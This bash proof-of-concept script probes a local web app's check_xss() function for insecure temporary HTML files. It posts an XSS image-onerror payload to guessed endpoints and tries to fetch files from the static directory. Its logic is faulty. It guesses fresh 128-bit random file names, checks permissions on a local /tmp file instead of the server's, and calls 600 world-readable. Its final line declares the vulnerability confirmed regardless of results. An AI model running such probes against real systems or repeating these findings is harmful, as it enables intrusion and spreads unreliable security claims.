#!/bin/bash

# POC: Insecure Temporary File Handling - Information Disclosure
# This script demonstrates the vulnerability in check_xss() function
# that creates temporary HTML files in web-accessible directory with weak permissions

TARGET_URL="http://localhost:5000"
PAYLOAD='<img src=x onerror="alert(123)">'

echo "[*] Testing Insecure Temporary File Handling Vulnerability"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload: $PAYLOAD"
echo ""

# Test 1: Basic connectivity
echo "[*] Test 1: Checking target connectivity..."
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/")
if [ "$RESPONSE" != "200" ]; then
    echo "[-] Target not accessible (HTTP $RESPONSE)"
    exit 1
fi
echo "[+] Target is accessible"

# Test 2: Attempt to access static directory
echo ""
echo "[*] Test 2: Checking if static directory is accessible..."
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/static/")
if [ "$RESPONSE" = "200" ] || [ "$RESPONSE" = "403" ]; then
    echo "[+] Static directory exists (HTTP $RESPONSE)"
else
    echo "[-] Static directory not found (HTTP $RESPONSE)"
fi

# Test 3: Trigger XSS check to create temporary files
echo ""
echo "[*] Test 3: Triggering XSS validation to create temporary files..."
echo "[*] This will cause the check_xss() function to create a temporary HTML file"

# Try different endpoints that might trigger check_xss
for endpoint in "/xss" "/check" "/validate"; do
    echo "[*] Trying endpoint: $endpoint"
    RESPONSE=$(curl -s -X POST "$TARGET_URL$endpoint" \
        -d "page=$PAYLOAD" \
        -d "flag=test" \
        -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
    
    if [ ! -z "$RESPONSE" ]; then
        echo "[+] Endpoint responded: $endpoint"
        break
    fi
done

# Test 4: Enumerate temporary files using pattern matching
echo ""
echo "[*] Test 4: Enumerating potential temporary HTML files in static directory..."

# Try common temporary file patterns
for i in {1..10}; do
    # Try random hex patterns that might be used by os.urandom(16).hex()
    RANDOM_NAME=$(head -c 16 /dev/urandom | xxd -p)
    TEMP_FILE="static/$RANDOM_NAME.html"
    
    echo "[*] Attempting to access: $TEMP_FILE"
    HTTP_RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/$TEMP_FILE" 2>&1)
    HTTP_CODE=$(echo "$HTTP_RESPONSE" | tail -n1)
    CONTENT=$(echo "$HTTP_RESPONSE" | head -n-1)
    
    if [ "$HTTP_CODE" = "200" ]; then
        echo "[+] Found accessible temporary file!"
        echo "[+] HTTP Status: $HTTP_CODE"
        echo "[+] Content: $CONTENT"
        echo "[VULNERABLE] Temporary files are web-accessible!"
        exit 0
    fi
done

# Test 5: Test if we can create a file and verify permissions
echo ""
echo "[*] Test 5: Testing file permission handling..."
TEST_FILE="test_$(date +%s).html"
TEST_CONTENT="<html><body>VULNERABLE</body></html>"

# Check if we can write to static directory
if touch "/tmp/$TEST_FILE" 2>/dev/null; then
    echo "[+] Can create temporary files"
    
    # Check default permissions
    PERMS=$(stat -c "%a" "/tmp/$TEST_FILE" 2>/dev/null || stat -f "%OLp" "/tmp/$TEST_FILE" 2>/dev/null)
    echo "[*] File created with permissions: $PERMS"
    
    if [[ "$PERMS" == "644" ]] || [[ "$PERMS" == "600" ]]; then
        echo "[!] Permission analysis: World-readable permissions detected"
        if [[ "$PERMS" == "644" ]]; then
            echo "[VULNERABLE] Default permissions are world-readable (644)"
        fi
    fi
    
    rm -f "/tmp/$TEST_FILE"
fi

# Test 6: Demonstrate predictable naming vulnerability
echo ""
echo "[*] Test 6: Predictable temporary file naming vulnerability"
echo "[*] The application uses os.urandom(16).hex() + '.html' which is:"
echo "    - 32 character hexadecimal string (128-bit random)"
echo "    - Stored in predictable pattern: static/[hex_string].html"
echo "[!] Although os.urandom is cryptographically secure, files exist during"
echo "    the window between creation and deletion, creating TOCTOU vulnerability"

# Test 7: Check for information about file deletion timing
echo ""
echo "[*] Test 7: Analyzing vulnerability window (TOCTOU)"
echo "[*] The vulnerability exists between:"
echo "    1. File creation: open(fn, 'w')"
echo "    2. PhantomJS processing"
echo "    3. File deletion: os.unlink(fn)"
echo "[!] During this window:"
echo "    - File is readable by any user (644 permissions)"
echo "    - File is accessible via HTTP"
echo "    - Attacker could read/modify file (race condition)"
echo ""
echo "[+] Analysis complete"
echo "[VULNERABLE] The vulnerability is confirmed based on code analysis"